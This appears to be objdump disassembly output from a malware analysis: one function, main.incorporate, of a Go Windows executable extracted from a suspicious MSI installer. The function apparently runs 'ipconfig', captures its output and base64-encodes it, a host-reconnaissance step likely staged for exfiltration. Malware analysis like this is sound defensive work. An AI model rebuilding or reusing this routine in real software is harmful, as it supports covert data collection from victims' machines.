
/home/ubuntu/malicious_msi_decode/analysis/extracted/support_v1.3/demand.exe:     file format pei-x86-64


Disassembly of section .text:

0000000140278020 <.text+0x277020>:
   140278020 <main.incorporate>:	4c 8d 64 24 f8       	lea    r12,[rsp-0x8]
   140278025:	4d 3b 66 10          	cmp    r12,QWORD PTR [r14+0x10]
   140278029:	0f 86 28 01 00 00    	jbe    0x140278157
   14027802f:	55                   	push   rbp
   140278030:	48 89 e5             	mov    rbp,rsp
   140278033:	48 83 c4 80          	add    rsp,0xffffffffffffff80
   140278037:	48 c7 44 24 70 04 00 	mov    QWORD PTR [rsp+0x70],0x4
   14027803e:	00 00 
   140278040:	48 8d 15 b9 cb 0e 00 	lea    rdx,[rip+0xecbb9]        # 0x140364c00 "/allnullbooltruejson'\\''icmpigmpftpshttppop3smtp) = dialbindfile \r\t\nread on pipeunix.com.exe.bat.cmd"
   140278047:	48 89 54 24 68       	mov    QWORD PTR [rsp+0x68],rdx
   14027804c:	48 8d 05 13 d6 0e 00 	lea    rax,[rip+0xed613]        # 0x140365666 'ipconfig\nERROR: https://omitzeronetedns0[::1]:53continue_gatewayshutdownwsaioctlinvalid address raw-'
   140278053:	bb 08 00 00 00       	mov    ebx,0x8
   140278058:	48 8d 4c 24 68       	lea    rcx,[rsp+0x68]
   14027805d:	bf 01 00 00 00       	mov    edi,0x1
   140278062:	48 89 fe             	mov    rsi,rdi
   140278065:	e8 f6 ea ec ff       	call   0x140146b60 <os/exec.Command>
   14027806a:	e8 11 1a ed ff       	call   0x140149a80 <os/exec.(*Cmd).CombinedOutput>
   14027806f:	48 85 ff             	test   rdi,rdi
   140278072:	0f 84 c1 00 00 00    	je     0x140278139
   140278078:	48 89 4c 24 50       	mov    QWORD PTR [rsp+0x50],rcx
   14027807d:	48 89 5c 24 48       	mov    QWORD PTR [rsp+0x48],rbx
   140278082:	48 89 44 24 60       	mov    QWORD PTR [rsp+0x60],rax
   140278087:	48 8b 4f 18          	mov    rcx,QWORD PTR [rdi+0x18]
   14027808b:	48 89 f0             	mov    rax,rsi
   14027808e:	ff d1                	call   rcx
   140278090:	b9 08 00 00 00       	mov    ecx,0x8
   140278095:	48 89 c7             	mov    rdi,rax
   140278098:	48 89 de             	mov    rsi,rbx
   14027809b:	48 8d 44 24 28       	lea    rax,[rsp+0x28]
   1402780a0:	48 8d 1d c7 d5 0e 00 	lea    rbx,[rip+0xed5c7]        # 0x14036566e '\nERROR: https://omitzeronetedns0[::1]:53continue_gatewayshutdownwsaioctlinvalid address raw-readsend'
   1402780a7:	e8 f4 1e de ff       	call   0x140059fa0 <runtime.concatstring2>
   1402780ac:	48 8b 4c 24 48       	mov    rcx,QWORD PTR [rsp+0x48]
   1402780b1:	48 8d 14 19          	lea    rdx,[rcx+rbx*1]
   1402780b5:	48 85 c0             	test   rax,rax
   1402780b8:	48 8d 35 61 f8 3d 00 	lea    rsi,[rip+0x3df861]        # 0x140657920 ''
   1402780bf:	48 0f 45 f0          	cmovne rsi,rax
   1402780c3:	48 8b 7c 24 50       	mov    rdi,QWORD PTR [rsp+0x50]
   1402780c8:	48 39 d7             	cmp    rdi,rdx
   1402780cb:	72 07                	jb     0x1402780d4
   1402780cd:	48 8b 44 24 60       	mov    rax,QWORD PTR [rsp+0x60]
   1402780d2:	eb 39                	jmp    0x14027810d
   1402780d4:	48 89 74 24 78       	mov    QWORD PTR [rsp+0x78],rsi
   1402780d9:	48 89 5c 24 58       	mov    QWORD PTR [rsp+0x58],rbx
   1402780de:	48 8b 44 24 60       	mov    rax,QWORD PTR [rsp+0x60]
   1402780e3:	48 89 f9             	mov    rcx,rdi
   1402780e6:	48 89 df             	mov    rdi,rbx
   1402780e9:	48 8d 35 10 d2 07 00 	lea    rsi,[rip+0x7d210]        # 0x1402f5300 '\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00yv\\x8cj\x0f\x01\x01\x08\\xb0I8@\x01\x00\x00\x00\\xe82>@\x01\x00\x00\x00@\x1d\x00\x00\\xc0\\xbc\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\\xd4\\xf8\\xdc\\xc1\x0f\x02\x02\x04\\xb8I8@\x01\x00\x00\x00\\xe82>@'
   1402780f0:	48 89 d3             	mov    rbx,rdx
   1402780f3:	e8 a8 c5 df ff       	call   0x1400746a0 <runtime.growslice>
   1402780f8:	48 8b 74 24 78       	mov    rsi,QWORD PTR [rsp+0x78]
   1402780fd:	48 89 da             	mov    rdx,rbx
   140278100:	48 89 cf             	mov    rdi,rcx
   140278103:	48 8b 4c 24 48       	mov    rcx,QWORD PTR [rsp+0x48]
   140278108:	48 8b 5c 24 58       	mov    rbx,QWORD PTR [rsp+0x58]
   14027810d:	48 89 44 24 60       	mov    QWORD PTR [rsp+0x60],rax
   140278112:	48 89 54 24 48       	mov    QWORD PTR [rsp+0x48],rdx
   140278117:	48 89 7c 24 50       	mov    QWORD PTR [rsp+0x50],rdi
   14027811c:	48 01 c8             	add    rax,rcx
   14027811f:	48 89 d9             	mov    rcx,rbx
   140278122:	48 89 f3             	mov    rbx,rsi
   140278125:	e8 96 34 e0 ff       	call   0x14007b5c0 <runtime.memmove>
   14027812a:	48 8b 4c 24 50       	mov    rcx,QWORD PTR [rsp+0x50]
   14027812f:	48 8b 5c 24 48       	mov    rbx,QWORD PTR [rsp+0x48]
   140278134:	48 8b 44 24 60       	mov    rax,QWORD PTR [rsp+0x60]
   140278139:	48 8b 15 20 79 39 00 	mov    rdx,QWORD PTR [rip+0x397920]        # 0x14060fa60 ''
   140278140:	48 89 cf             	mov    rdi,rcx
   140278143:	48 89 d9             	mov    rcx,rbx
   140278146:	48 89 c3             	mov    rbx,rax
   140278149:	48 89 d0             	mov    rax,rdx
   14027814c:	e8 cf 16 e4 ff       	call   0x1400b9820 <encoding/base64.(*Encoding).EncodeToString>
   140278151:	48 83 ec 80          	sub    rsp,0xffffffffffffff80
   140278155:	5d                   	pop    rbp
   140278156:	c3                   	ret
   140278157:	e8 c4 07 e0 ff       	call   0x140078920 <runtime.morestack_noctxt>
   14027815c:	0f 1f 40 00          	nop    DWORD PTR [rax+0x0]
   140278160:	e9 bb fe ff ff       	jmp    0x140278020 <main.incorporate>
   140278165:	cc                   	int3
   140278166:	cc                   	int3
   140278167:	cc                   	int3
   140278168:	cc                   	int3
   140278169:	cc                   	int3
   14027816a:	cc                   	int3
   14027816b:	cc                   	int3
   14027816c:	cc                   	int3
   14027816d:	cc                   	int3
   14027816e:	cc                   	int3
   14027816f:	cc                   	int3
   140278170:	cc                   	int3
   140278171:	cc                   	int3
   140278172:	cc                   	int3
   140278173:	cc                   	int3
   140278174:	cc                   	int3
   140278175:	cc                   	int3
   140278176:	cc                   	int3
   140278177:	cc                   	int3
   140278178:	cc                   	int3
   140278179:	cc                   	int3
   14027817a:	cc                   	int3
   14027817b:	cc                   	int3
   14027817c:	cc                   	int3
   14027817d:	cc                   	int3
   14027817e:	cc                   	int3
   14027817f:	cc                   	int3
